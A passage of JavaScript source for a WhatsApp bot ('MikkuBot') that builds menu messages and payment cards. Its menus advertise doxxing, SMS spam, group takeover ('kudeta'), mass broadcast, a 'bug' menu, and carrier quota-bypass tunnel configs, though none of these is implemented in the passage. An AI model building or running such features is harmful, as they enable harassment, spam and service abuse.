┋░▹ ${prefix}ᴀɴᴛɪʟɪɴᴋ
┋░▹ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
┋░▹ ${prefix}ᴅᴇᴍᴏᴛᴇ
┋░▹ ${prefix}sᴇᴛᴅᴇsᴋ
┋░▹ ${prefix}ᴋᴜᴅᴇᴛᴀ
┋░▹ ${prefix}ɪᴅɢᴄ
┋░▹ ${prefix}ᴘʀᴏᴍᴏᴛᴇᴀʟʟ
┋░▹ ${prefix}ᴅᴇᴍᴏᴛᴇᴀʟʟ
┋░▹ ${prefix}ɢʀᴏᴜᴘ ᴏᴘᴇɴ/ᴄʟᴏsᴇ
┋░▹ ${prefix}ᴛᴏᴛᴀɢ
┋░▹ ${prefix}ʟɪsᴛɢᴄ
┋░▹ ${prefix}ᴘɪɴ
┋░▹ ${prefix}ᴋɪᴄᴋᴀʟʟ
┋░▹ ${prefix}ʟɪsᴛᴏɴ
┋░▹ ${prefix}ᴄʟᴏɴᴇɢᴄ (ᴇʀʀᴏʀ)
┋░▹ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`JPM MENU\`
┋░▹ ${prefix}ᴊᴘᴍ
┋░▹ ${prefix}ᴊᴘᴍ2
┋░▹ ${prefix}ᴊᴘᴍᴛᴇsᴛɪ
┋░▹ ${prefix}ᴛᴇᴋsᴊᴘᴍ
┋░▹ ${prefix}sᴇᴛᴛᴇᴋsᴊᴘᴍ
┋░▹ ${prefix}ᴊᴘᴍᴛᴀɢ
┋░▹ ${prefix}ᴊᴘᴍsʟɪᴅᴇ
┋░▹ ${prefix}ʟɪsᴛɢᴄ
┋░▹ ${prefix}sᴛᴀʀᴛᴊᴘᴍ
┋░▹ ${prefix}ᴊᴘᴍᴘʀᴏᴍᴏsɪ
┋░▹ ${prefix}ʙᴄɢᴄ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`BUY SERVER MENU\`
┋░▹ ${prefix}ʙᴜʏsʀᴠ1ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ2ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ3ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ4ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ5ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ6ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ7ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠ8ɢʙ
┋░▹ ${prefix}ʙᴜʏsʀᴠᴜɴʟɪ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`PUSH MENU\`
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ1 ɪᴅɢᴄ|ᴘᴇsᴀɴ
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ2 ɪᴅɢᴄ|ᴊᴇᴅᴀ|ᴘᴇsᴀɴ
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ3 ᴊᴇᴅᴀ|ᴛᴇᴋs
┋░▹ ${prefix}sᴀᴠᴇᴋᴏɴᴛᴀᴋ
┋░▹ ${prefix}sᴀᴠᴇᴋᴏɴᴛᴀᴋ2
┋░▹ ${prefix}ɪᴅɢᴄ
┋░▹ ${prefix}ʟɪsᴛɢᴄ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`PANEL PRIVATE MENU\`
┋░▹ ${prefix}ʀᴀᴍʟɪsᴛ2
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ2
┋░▹ ${prefix}ᴀᴅᴅᴀᴅᴍɪɴ2
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ2
┋░▹ ${prefix}ᴀᴅᴅᴜsʀ2
┋░▹ ${prefix}sᴜsᴘᴇɴᴅ2
┋░▹ ${prefix}ᴀᴅᴅsʀᴠ2
┋░▹ ${prefix}ʟɪsᴛᴜsʀ2
┋░▹ ${prefix}ʟɪsᴛsʀᴠ2
┋░▹ ${prefix}ᴜɴsᴜsᴘᴇɴᴅ2
┋░▹ ${prefix}ᴅᴇʟᴜsʀ2
┋░▹ ${prefix}ʀᴇɪɴsᴛᴀʟʟ2
┋░▹ ${prefix}ᴅᴇʟsʀᴠ2
┋░▹ ${prefix}ʟɪɴᴋʟᴏɢ2
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`PANEL PUBLIC MENU\`
┋░▹ ${prefix}ʀᴀᴍʟɪsᴛ
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ
┋░▹ ${prefix}ᴀᴅᴅᴀᴅᴍɪɴ
┋░▹ ${prefix}sᴜsᴘᴇɴᴅ
┋░▹ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ
┋░▹ ${prefix}ʟɪsᴛᴜsʀ
┋░▹ ${prefix}ʟɪsᴛsʀᴠ
┋░▹ ${prefix}ᴜɴsᴜsᴘᴇɴᴅ
┋░▹ ${prefix}ʙᴜʏᴀᴅᴍɪɴ
┋░▹ ${prefix}ᴅᴇʟᴜsʀ
┋░▹ ${prefix}ᴅᴇʟsʀᴠ
┋░▹ ${prefix}ʟɪɴᴋʟᴏɢ
┋░▹ ${prefix}ʀᴇɪɴsᴛᴀʟʟ
┗━━━━━━━━━━━━━━━━━━

┏╍╍╍┉╍☉ \`TOOLS MENU\`
┋░▹ ${prefix}sᴛɪᴄᴋᴇʀ
┋░▹ ${prefix}ᴅᴇʟᴇᴛᴇ
┋░▹ ${prefix}ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
┋░▹ ${prefix}sɪɴᴅʏ
┋░▹ ${prefix}ʟᴀᴄᴀᴋɪᴘ
┋░▹ ${prefix}ʀᴇᴍɪɴɪ
┋░▹ ${prefix}sᴘᴀᴍsᴍs
┋░▹ ${prefix}ᴛᴏᴜʀʟ
┋░▹ ${prefix}ᴍʏɪᴘ
┋░▹ ${prefix}ᴅᴏx
┋░▹ ${prefix}ɢᴇᴛɴɪᴋ
┋░▹ ${prefix}sʜᴏʀᴛʟɪɴᴋ
┋░▹ ${prefix}ᴛᴏɪᴍɢ
┋░▹ ${prefix}sᴇᴡᴀʙᴏᴛ
┋░▹ ${prefix}ʟɪsᴛᴏɴ
┋░▹ ${prefix}ᴘɪɴ
┗━━━━━━━━━━━━━━━━━━`

           tamzz.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await tamzz.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: qpayment
                    })
                }
             break
case "ownermenu": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`OWNER MENU\`
┋░▹ ${prefix}sᴇʟғ
┋░▹ ${prefix}ᴘᴜʙʟɪᴄ
┋░▹ ${prefix}sᴇᴛᴘᴘʙᴏᴛ
┋░▹ ${prefix}ᴜɴʙʟᴏᴄᴋ
┋░▹ ${prefix}ᴘᴀʏ2
┋░▹ ${prefix}ʙʟᴏᴄᴋ
┋░▹ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ2
┋░▹ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ2
┋░▹ ${prefix}ᴅᴇʟsᴇsɪ
┋░▹ ${prefix}ᴘᴀʏ
┋░▹ ${prefix}ɢᴇᴛʙɪᴏ
┋░▹ ${prefix}ᴇɴᴄ
┋░▹ ${prefix}ᴀᴅᴅᴘʀᴇᴍ2
┋░▹ ${prefix}ᴅᴇʟᴘʀᴇᴍ2
┋░▹ ${prefix}ᴀᴅᴅsᴀʟᴅᴏ
┋░▹ ${prefix}ᴍɪɴsᴀʟᴅᴏ
┋░▹ ${prefix}ʟᴇᴀᴠᴇ
┋░▹ ${prefix}ᴄʜᴇᴄᴋ-ʜᴏsᴛ
┋░▹ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
┋░▹ ${prefix}ʀᴇɪɴsᴛᴀʟʟ
┋░▹ ${prefix}ᴅᴇʟᴘʀᴇᴍ
┋░▹ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┋░▹ ${prefix}ᴅᴏɴᴇ
┋░▹ ${prefix}ʙᴀᴛᴀʟ
┋░▹ ${prefix}ᴊᴏɪɴ
┋░▹ ${prefix}ʟᴇᴀᴠᴇ
┋░▹ ${prefix}ᴀᴅᴅᴄᴀsᴇ
┋░▹ ${prefix}ʙᴀᴄᴋᴜᴘ
┋░▹ ${prefix}ᴅᴇʟᴄᴀsᴇ
┋░▹ ${prefix}ʟɪsᴛᴄᴀsᴇ
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat ${namaCreator}\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "jpmmenu": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`JPM MENU\`
┋░▹ ${prefix}ᴊᴘᴍ
┋░▹ ${prefix}ᴊᴘᴍ2
┋░▹ ${prefix}ᴊᴘᴍᴛᴇsᴛɪ
┋░▹ ${prefix}ᴛᴇᴋsᴊᴘᴍ
┋░▹ ${prefix}sᴇᴛᴛᴇᴋsᴊᴘᴍ
┋░▹ ${prefix}ᴊᴘᴍᴛᴀɢ
┋░▹ ${prefix}ᴊᴘᴍsʟɪᴅᴇ
┋░▹ ${prefix}ʟɪsᴛɢᴄ
┋░▹ ${prefix}sᴛᴀʀᴛᴊᴘᴍ
┋░▹ ${prefix}ᴊᴘᴍᴘʀᴏᴍᴏsɪ
┋░▹ ${prefix}ʙᴄɢᴄ
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Start Jpm\",\"title\":\"Start Jpm\",\"id\":\".startjpm\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "pushmenu": {
let teksmenu = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`PUSH MENU\`
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ1 ɪᴅɢᴄ|ᴘᴇsᴀɴ
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ2 ɪᴅɢᴄ|ᴊᴇᴅᴀ|ᴘᴇsᴀɴ
┋░▹ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ3 ᴊᴇᴅᴀ|ᴛᴇᴋs
┋░▹ ${prefix}sᴀᴠᴇᴋᴏɴᴛᴀᴋ
┋░▹ ${prefix}sᴀᴠᴇᴋᴏɴᴛᴀᴋ2
┋░▹ ${prefix}ɪᴅɢᴄ
┋░▹ ${prefix}ʟɪsᴛɢᴄ
┗━━━━━━━━━━━━━━━━━━`
tamzz.sendMessage(m.chat, {
text: textmenu,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'MikkuBot',
thumbnailUrl: 'https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg',
sourceUrl: "https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: qpayment})
}
break
case "otomatismenu": {
let teksnya = `Hai Onii Chan @${sender.split("@")[0]}

┏╍╍╍┉╍☉ \`INFO USER\`
┋░▹ *Name* : ${pushname}
┋░▹ *Number* : ${m.sender.split('@')[0]}
┋░▹ *Status* : ${isPremium ? "Premium" : "Free"}
┗━━━━━━━━━━━━━━━━━━`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Click Here", "sections": [{ "title": "Silahkan Pilih Menu Otomatis Di Bawah", "highlight_label": \"Powered By ${namaCreator}\", "rows": [{ "header": "Add Saldo", "title": "Menambahkan Saldo", "id": ".addsaldo" }, 
{ "header": "BUY ADMIN", "title": "Membeli Admin Panel", "id": ".buyadmin" },
{ "header": "MINUS SALDO", "title": "Mengurangi Saldo", "id": ".minsaldo" }, 
{ "header": "CEK SALDO", "title": "Mengecek Saldo", "id": ".saldo" }, 
{ "header": "LIST BUY SERVER", "title": "List Ram Buy Panel", "id": ".listbuysrv" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'antilink': {
let teksnya = `Halo Onii Chan @${sender.split("@")[0]} 👋
 `
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Antilink ON\",\"title\":\"Antilink Enable\",\"id\":\".antilink2 on\"}" 
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Antilink OFF\",\"title\":\"Antilink Disable\",\"id\":\".antilink2 off\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'pay2':{
const urldana = "https://telegra.ph/file/32f64187d259001c28856.jpg"
const urlgopay = "https://telegra.ph/file/2d39976c026a4bcc3430d.jpg"
const urlovo = "https://telegra.ph/file/4a5898d07b6665d97c249.jpg"
const urlqris = "https://telegra.ph/file/e7d4fde42091ef346fb75.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: tamzz.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {},
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT DANA MikkuBot\n\n*SERTAKAN SS BUKTI TF YA ONII-CHAN*` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"085727035336\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urldana),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT GOPAY MikkuBot\n\n*SERTAKAN SS BUKTI TF YA ONII-CHAN*` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"085727035336\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlovo),
                      hasMediaAttachment: true,
                    },
                    body: { text: `PAYMENT OVO MikkuBot\n\n*SERTAKAN SS BUKTI TF YA ONII-CHAN*` },
                    nativeFlowMessage: {
                      buttons: [
                        {
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Payment\",\"id\":\"123456789\",\"copy_code\":\"085727035336\"}`
},
                      ],
                    },
                  },
                  {
                    header: {
                      imageMessage: await image(urlqris),
                      hasMediaAttachment: true,
                    },
                    body: { text: `QRIS ALLPAY MikkuBot\n\n*SERTAKAN SS BUKTI TF YA ONII-CHAN*` },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "cta_url",
                          buttonParamsJson:
                            '{"display_text":"SCAN DI ATAS)","url":"https:\\/\\/wa.me\\/6285727035336","webview_presentation":null}',
                        },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      {}
    );

    await tamzz.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
            }
break

case 'menuv2': case 'menu2': {
    let teksnya = `*Hallo Onii-Chan @${sender.split("@")[0]} 👋*
_Saya adalah MIKKUBOT, Bot WhatsApp yg Dikembangkan Oleh fadzvpn_

┏╍╍╍┉╍☉ \`INFO USER\`
┋░▹ *Name* : ${pushname}
┋░▹ *Number* : ${m.sender.split('@')[0]}
┋░▹ *Status* : ${isPremium ? "Premium" : "Free"}
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`INFO BOT\`
┋░▹ *Bot Name* : MikkuBot
┋░▹ *Nomor Creator* : @${owner.split("@")[0]}
┋░▹ *Versi Bailyes* : ${version}
┋░▹ *Runtime* : ${runtime(process.uptime())}
┋░▹ *Jam* : ${wib}
┋░▹ *Today* : ${hariini}
┗━━━━━━━━━━━━━━━━━━`;

    let msgii = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender],
                        externalAdReply: {
                            showAdAttribution: true
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teksnya
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        hasMediaAttachment: true,
                        ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png") }, { upload: tamzz.waUploadToServer }))
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "Click Button Di Bawah"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [{
                            "name": "single_select",
                            "buttonParamsJson": `{
                                "title": "Click Here",
                                "sections": [{
                                    "title": "Silahkan Pilih Menu Di Bawah",
                                    "highlight_label": "Powered By ${namaCreator}",
                                    "rows": [
                                        { "header": "ALL MENU", "title": "Semua Fitur Bot", "id": ".allmenu" },
                                        { "header": "OWNER MENU", "title": "Menampilkan Menu Owner", "id": ".ownermenu" },
                                        { "header": "PANEL MENU", "title": "Menampilkan Menu Panel", "id": ".panelmenu" },
                                        { "header": "PUSH MENU", "title": "Menampilkan Menu Push", "id": ".pushmenu" },
                                        { "header": "MENU INSTALL PANEL", "title": "Menampilkan Menu Install Panel", "id": ".installpanelmenu" },
                                        { "header": "MENU VPS DO", "title": "Menampilkan Menu Vps Digital ocean", "id": ".vpsmenu" },
                                        { "header": "JPM MENU", "title": "Menampilkan Menu Jpm", "id": ".jpmmenu" },
                                        { "header": "GROUP MENU", "title": "Menampilkan Menu Group", "id": ".groupmenu" },
                                        { "header": "MENU BUG", "title": "Menampilkan Menu Bug", "id": ".bugmenu" },
                                        { "header": "MENU FUN", "title": "Menampilkan Menu Tools", "id": ".toolsmenu" },
                                        { "header": "OTOMATIS MENU", "title": "Menampilkan Menu Otomatis", "id": ".otomatismenu" },
                                        { "header": "MENU CONFIG HC", "title": "Menampilkan Menu Config Hc", "id": ".menuconfig" }
                                    ]
                                }]
                            }`
                        }]
                    })
                })
            }
        }
    }, { userJid: m.sender, quoted: qpayment });

    await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, {
        messageId: msgii.key.id
    });
}
break

//=========================

case 'menuconfig': {
    let teksnya = `*Hallo Onii-Chan @${sender.split("@")[0]} 👋*

┏╍╍╍┉╍☉ \`INFO USER\`
┋░▹ *Name* : ${pushname}
┋░▹ *Number* : ${m.sender.split('@')[0]}
┋░▹ *Status* : ${isPremium ? "Premium" : "Free"}
┗━━━━━━━━━━━━━━━━━━
┏╍╍╍┉╍☉ \`INFO BOT\`
┋░▹ *Bot Name* : MikkuBot
┋░▹ *Nomor Creator* : @${owner.split("@")[0]}
┋░▹ *Versi Bailyes* : ${version}
┋░▹ *Runtime* : ${runtime(process.uptime())}
┋░▹ *Jam* : ${wib}
┋░▹ *Today* : ${hariini}
┗━━━━━━━━━━━━━━━━━━
⎙ \`MENU CONFIG\` ⎙
⨳ _Silahkan Kalian Pilih Sesuai Kebutuhan_
⨳ _Tidak Konek? Berarti Ga support Tkpmu_
⨳ _Mau Speed Stabil dan Support Game? Buy Premium_

`;

    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { 
                    "deviceListMetadata": {}, 
                    "deviceListMetadataVersion": 2
                }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { 
                        mentionedJid: [m.sender], 
                        externalAdReply: {
                            showAdAttribution: true 
                        }
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: teksnya
                    }), 
                    header: proto.Message.InteractiveMessage.Header.create({ 
                        hasMediaAttachment: true, 
                        ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./thumb.png")}, { upload: tamzz.waUploadToServer })) 
                    }), 
                    footer: proto.Message.InteractiveMessage.Footer.create({ 
                        text: global.foother
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "single_select",
                            "buttonParamsJson": `{ "title": "Click Here", "sections": [{ "title": "Silahkan Pilih File Di Bawah", "highlight_label": "Recommended", "rows": [
                                { "header": "ALL CONFIG", "title": "Klik untuk mengirim File", "id": ".sendfile allconfig.zip" }, 
                                { "header": "AXIS EDU1", "title": "Klik untuk mengirim File", "id": ".sendfile axisedu1.hc" },
                                { "header": "AXIS EDU2", "title": "Klik untuk mengirim File", "id": ".sendfile axisedu2" }, 
                                { "header": "AXIS EDU3", "title": "Klik untuk mengirim File", "id": ".sendfile axisedu3.hc" },
                                
                                { "header": "AXIS FB1", "title": "Klik untuk mengirim File", "id": ".sendfile axisfb1.hc" }, 
                                { "header": "AXIS FB2", "title": "Klik untuk mengirim File", "id": ".sendfile axisfb2.hc" },
                                
                                { "header": "AXIS GAME1", "title": "Klik untuk mengirim File", "id": ".sendfile axisgame1.hc" }, 
                                { "header": "AXIS GAME2", "title": "Klik untuk mengirim File", "id": ".sendfile axisgame2.hc" },
                                { "header": "AXIS GAME3", "title": "Klik untuk mengirim File", "id": ".sendfile axisgame3.hc" }, 
                                { "header": "AXIS GAME4", "title": "Klik untuk mengirim File", "id": ".sendfile axisgame4.hc" },
                                { "header": "AXIS GAME5", "title": "Klik untuk mengirim File", "id": ".sendfile axisgame5.hc" }, 
                                
                                { "header": "AXIS GENFLIX1", "title": "Klik untuk mengirim File", "id": ".sendfile axisgenflix1.hc" },
                                { "header": "AXIS GENFLIX2", "title": "Klik untuk mengirim File", "id": ".sendfile axisgenflix2.hc" }, 
                                
                                { "header": "AXIS IG", "title": "Klik untuk mengirim File", "id": ".sendfile axisig.hc" },
                                { "header": "AXIS KOMIK", "title": "Klik untuk mengirim File", "id": ".sendfile axiskomik.hc" }, 
                                { "header": "AXIS MUSIK", "title": "Klik untuk mengirim File", "id": ".sendfile axismusik.hc" },
                                { "header": "AXIS NETFLIX", "title": "Klik untuk mengirim File", "id": ".sendfile axisnetflix.hc" }, 
                                { "header": "AXIS OPOK1", "title": "Klik untuk mengirim File", "id": ".sendfile axisopok1.hc" },
                                
                                { "header": "AXIS SOSMED1", "title": "Klik untuk mengirim File", "id": ".sendfile axissosmed1.hc" }, 
                                { "header": "AXIS SOSMED2", "title": "Klik untuk mengirim File", "id": ".sendfile axissosmed2.hc" },
                                { "header": "AXIS SOSMED3", "title": "Klik untuk mengirim File", "id": ".sendfile axissosmed3.hc" }, 
                                
                                { "header": "AXIS SPOTIFY", "title": "Klik untuk mengirim File", "id": ".sendfile axisspotify.hc" },
                                { "header": "AXIS SUSHIROLL1", "title": "Klik untuk mengirim File", "id": ".sendfile axissushiroll1.hc" }, 
                                { "header": "AXIS SUSHIROLL2", "title": "Klik untuk mengirim File", "id": ".sendfile axissushiroll2.hc" },
                                
                                { "header": "AXIS TIKTOK", "title": "Klik untuk mengirim File", "id": ".sendfile axistiktok" }, 
                                { "header": "AXIS VIDIO1", "title": "Klik untuk mengirim File", "id": ".sendfile axisvidio1.hc" },
                                { "header": "AXIS VIDIO2", "title": "Klik untuk mengirim File", "id": ".sendfile axisvidio2.hc" }, 
                                
                                { "header": "AXIS VIU", "title": "Klik untuk mengirim File", "id": ".sendfile axisviu.hc" },
                                { "header": "AXIS WA", "title": "Klik untuk mengirim File", "id": ".sendfile axiswa.hc" }, 
                                
                                { "header": "AXIS XL CONFER1", "title": "Klik untuk mengirim File", "id": ".sendfile axisxlconfrence1.hc" },
                                { "header": "AXIS XL CONFER2", "title": "Klik untuk mengirim File", "id": ".sendfile axisxlconfrence2" }, 
                                
                                { "header": "AXIS XL EDU1", "title": "Klik untuk mengirim File", "id": ".sendfile axisxledu1.hc" },
                                { "header": "AXIS XL EDU2", "title": "Klik untuk mengirim File", "id": ".sendfile axisxledu2.hc" }, 
                                { "header": "AXIS XL EDU3", "title": "Klik untuk mengirim File", "id": ".sendfile axisxledu3.hc" },
                                { "header": "AXIS XL EDU4", "title": "Klik untuk mengirim File", "id": ".sendfile axisxledu4.hc" }, 
                                { "header": "AXIS XL EDU5", "title": "Klik untuk mengirim File", "id": ".sendfile axisxledu5.hc" },
                                
                                { "header": "AXIS XL OPOK", "title": "Klik untuk mengirim File", "id": ".sendfile axisxlopok.hc" }, 
                                { "header": "KUOTA TIKTOK", "title": "Klik untuk mengirim File", "id": ".sendfile kuotatiktok.hc.hc" },
                                { "header": "ISAT APPSFUN", "title": "Klik untuk mengirim File", "id": ".sendfile isatappsfun.hc" }, 
                                
                                { "header": "ISAT GAME1", "title": "Klik untuk mengirim File", "id": ".sendfile isatgame1.hc" },
                                { "header": "ISAT GAME2", "title": "Klik untuk mengirim File", "id": ".sendfile isatgame2.hc" }, 
                                
                                { "header": "TSEL ILPED", "title": "Klik untuk mengirim File", "id": ".sendfile tselilped.hc" },
                                { "header": "TSEL OMG", "title": "Klik untuk mengirim File", "id": ".sendfile tselomg.hc" }, 
                                { "header": "TSEL RG", "title": "Klik untuk mengirim File", "id": ".sendfile tselruangguru.hc" },
                                { "header": "TSEL OPOK", "title": "Klik untuk mengirim File", "id": ".sendfile tselopok.hc" }, 
                                
                                { "header": "XL FB", "title": "Klik untuk mengirim File", "id": ".sendfile xlfb.hc" },
                                { "header": "XL FLEX", "title": "Klik untuk mengirim File", "id": ".sendfile xlflex.hc" }, 
                                { "header": "XL IFLIX", "title": "Klik untuk mengirim File", "id": ".sendfile xliflix.hc" },
                                { "header": "XL OPOK", "title": "Klik untuk mengirim File", "id": ".sendfile xlopok1.hc" },
                                
